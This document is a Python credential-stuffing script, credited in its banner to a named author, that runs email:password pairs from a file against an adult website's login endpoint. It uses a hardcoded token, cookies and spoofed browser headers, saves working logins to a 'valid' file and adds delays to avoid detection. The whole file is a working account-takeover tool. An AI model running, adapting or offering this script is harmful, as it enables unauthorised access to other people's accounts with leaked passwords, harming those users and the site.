import requests
import time
import simple_chalk as chalk
import yaml
import re

banner = """
    ___________       _______      __   ___         ______    
    ("     _   ")     /"     "|    |/"| /  ")       /    " \   
    )__/  \\__/     (: ______)    (: |/   /       // ____  \  
        \\_ /         \/    |      |    __/       /  /    ) :) 
        |.  |         // ___)_     (// _  \      (: (____/ //  
        \:  |        (:      "|    |: | \  \      \        /   
        \__|         \_______)    (__|  \__)      \"_____/    
                                                            
                                                                                                   
                        ( PH Checker )
                Coded by : github.com/TekoOfficial
             The Hell Is Busy With People Like Teko..
"""

e_input = chalk.magenta("[") + chalk.blue("Input") + chalk.magenta("]")

def info(text, status, account_number, total_lines) : 
    print(chalk.magenta("[") + chalk.blue(f"Info [{status}] - [{account_number}/{total_lines}]") + chalk.magenta("] ")+ chalk.green(text))

def delay_inf(text, delay) : 
    print(chalk.blue("[") + chalk.magenta(f"Delay [{delay}s]") + chalk.blue("] ")+ chalk.green(text))

def e_config(text) : 
    print(chalk.magenta("[") + chalk.blue("Config") + chalk.magenta("] ") + chalk.green(text))

def invalid(text, account_number, total_lines) : 
    print(chalk.red("[") + chalk.green(f"Invalid [{account_number}/{total_lines}]") + chalk.red("] ")+ chalk.red(text))

def valid(text, account_number, total_lines) : 
    print(chalk.green("[") + chalk.red(f"valid [{account_number}/{total_lines}]") + chalk.green("] ")+ chalk.green(text))

def error(text, account_number, total_lines) : 
    print(chalk.cyan("[") + chalk.red(f"Error [{account_number}/{total_lines}]") + chalk.cyan("] ")+ chalk.red(text))

def trying(text, account_number, total_lines) : 
    print(chalk.magenta("[") + chalk.green(f"Trying [{account_number}/{total_lines}]") + chalk.magenta("] ")+ chalk.magenta(text))

def line() : 
    print(chalk.red("\n#==============================#\n"))

def save(save_file,text):
    with open(save_file, 'a') as f:
                f.write(text + '\n')

# som config
url = 'https://www.pornhub.com/front/authenticate'  
email_regex = re.compile(r"[^@]+@[^@]+\.[^@]+")

# import config
config               = yaml.safe_load(open("config.yml"))
accounts_file        = config["files"]['accounts_file']
valid_file           = config["files"]['valid_file']
invalid_file         = config["files"]['invalid_file']
threading            = config["config"]['threading']
delay                = config["config"]["delay"]

print(chalk.red(banner))
e_config(f"Config Data : ")
e_config(f"Account Length : {len(open(accounts_file,'r').read().splitlines())}")
e_config(f"SMTP File : {accounts_file}")
e_config(f"Vaild Output File : {valid_file}")
e_config(f"Invalid Output File : {invalid_file}")
e_config(f"Threading Number : {threading}")
line()

input(f"{e_input} {chalk.green('PRESS ENTER TO START.')}")

with open(accounts_file, "r") as accounts :
        for account_number, account in enumerate(accounts, start=1) :
            total_lines = len(open(accounts_file,'r').read().splitlines())
            login_data = account.split(":")
            email = login_data[0]
            password = login_data[1].removesuffix("\n")
            
            if not email_regex.match(email):
                error(text=f"This Isn't Email You Idiot. ({email, password})", account_number=account_number, total_lines=total_lines)
                continue


            trying(text=f"{email, password}", account_number=account_number, total_lines=total_lines)

            data = {
                "token": "MTcyMTIxOTkxNhf5EHtME3QqJkKnApNqI5kmY53ltsZzvFNeQ0pRpwJI6bC1KC1edx62YPyul-_ul21pzHUAxs1TewZSDBijNuk.",
                "from": "pc_login_modal_:index",
                "email": email,
                "password": password
            } 
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-GB,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Content-Length': '236',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'ua=f1f6b29a6cc1f79a0fea05b885aa33d0; platform=pc; bs=91oht22gqtz5exduvv3py9bkmh3pe8qs; bsdd=91oht22gqtz5exduvv3py9bkmh3pe8qs; ss=800114159883879636; fg_afaf12e314c5419a855ddc0bf120670f=50712.100000; fg_7d31324eedb583147b6dcbea0051c868=54198.100000; __s=6697B769-42FE722901BB3860CB-A230A3F; __l=6697B769-42FE722901BB3860CB-A230A3F; accessAgeDisclaimerPH=1; etavt={"6551b90658d61":"1_24_2_NA|0"}',
                'Origin': 'https://www.pornhub.com',
                'Pragma': 'no-cache',
                'Priority': 'u=1, i',
                'Referer': 'https://www.pornhub.com/login',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Model': '""',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Gpc': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'
            }

            response = requests.post(url, data=data, headers=headers)
            message = response.json().get("message")
            if "Invalid" in message :
                 invalid(text=f"{message} ({email, password})", account_number=account_number, total_lines=total_lines)
                 save(save_file=invalid_file, text=f"{email}:{password}")
                 delay_inf(text="Delay Between accounts please wait.", delay=delay)       
                 time.sleep(delay)
                 continue
            info(text=response.json().get("message"), status=response.status_code, account_number=account_number, total_lines=total_lines)
            save(save_file=valid_file, text=f"{email}:{password}")
            delay_inf(text="Delay Between accounts please wait.", delay=delay)       
            time.sleep(delay)